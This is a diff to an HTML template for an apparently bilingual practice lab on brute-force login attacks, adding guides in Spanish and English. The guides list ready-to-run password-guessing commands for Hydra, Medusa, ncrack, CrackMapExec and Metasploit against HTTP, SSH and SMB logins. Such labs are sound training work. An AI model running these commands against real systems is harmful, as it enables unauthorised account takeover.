@@ -45,18 +45,6 @@
       </form>
     </div>
 
-    <div class="hl-card mb-4">
-      <div class="text-xs font-semibold uppercase tracking-wider mb-3 text-gray-400">Herramientas / Tools</div>
-      <div class="hl-code text-xs space-y-1">
-        <div class="text-gray-400"># Hydra — brute force user admin</div>
-        <div>hydra -l admin -P /usr/share/wordlists/rockyou.txt \</div>
-        <div class="pl-4">localhost -s 5000 http-post-form \</div>
-        <div class="pl-4">"/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas"</div>
-        <div class="mt-2 text-gray-400"># Burp Suite Intruder</div>
-        <div class="text-gray-400"># POST /bruteforce/login → Intruder → Sniper → mark §password§</div>
-        <div class="text-gray-400"># Payloads: Simple list → rockyou.txt → Launch → sort by length</div>
-      </div>
-    </div>
   </div>
 
   <!-- ── SSH Tab ── -->
@@ -118,7 +106,32 @@
       <li>Para SSH/SMB, reemplaza <code>TARGET_IP</code> por la IP de la máquina objetivo.</li>
     </ol>
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+    <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+    <h4>HTTP Login — Hydra</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  localhost -s 5000 http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas"</code></pre>
+    <h4>HTTP Login — Burp Suite Intruder</h4>
+    <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
+# Payloads: Simple list → rockyou.txt → Launch → ordenar por longitud</code></pre>
+    <h4>SSH — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
+medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
+ncrack -p 22 --user root -P rockyou.txt TARGET_IP</code></pre>
+    <h4>SSH — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+set RHOSTS TARGET_IP
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
+    <h4>SMB — Hydra / CrackMapExec</h4>
+    <pre><code class="language-bash">hydra -l Administrator -P rockyou.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</code></pre>
+    <h4>SMB — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
+set RHOSTS TARGET_IP
+set SMBUser Administrator
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
   </div>
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Usage Guide</h3>
@@ -131,7 +144,32 @@
       <li>For SSH/SMB, replace <code>TARGET_IP</code> with the target machine IP.</li>
     </ol>
     <h3>Tools</h3>
-    <div><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+    <div class="mb-3"><span class="tools-badge">hydra</span> <span class="tools-badge">medusa</span> <span class="tools-badge">ncrack</span> <span class="tools-badge">crackmapexec</span> <span class="tools-badge">Burp Intruder</span> <span class="tools-badge">Metasploit</span></div>
+    <h4>HTTP Login — Hydra</h4>
+    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  localhost -s 5000 http-post-form \
+  "/bruteforce/login:username=^USER^&password=^PASS^:Credenciales incorrectas"</code></pre>
+    <h4>HTTP Login — Burp Suite Intruder</h4>
+    <pre><code class="language-bash"># POST /bruteforce/login → Intruder → Sniper → mark §password§
+# Payloads: Simple list → rockyou.txt → Launch → sort by length</code></pre>
+    <h4>SSH — Hydra / Medusa / ncrack</h4>
+    <pre><code class="language-bash">hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
+medusa -h TARGET_IP -u root -P rockyou.txt -M ssh
+ncrack -p 22 --user root -P rockyou.txt TARGET_IP</code></pre>
+    <h4>SSH — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/ssh/ssh_login
+set RHOSTS TARGET_IP
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
+    <h4>SMB — Hydra / CrackMapExec</h4>
+    <pre><code class="language-bash">hydra -l Administrator -P rockyou.txt smb://TARGET_IP
+crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</code></pre>
+    <h4>SMB — Metasploit</h4>
+    <pre><code class="language-bash">use auxiliary/scanner/smb/smb_login
+set RHOSTS TARGET_IP
+set SMBUser Administrator
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run</code></pre>
   </div>
 </div>
 {% endblock %}
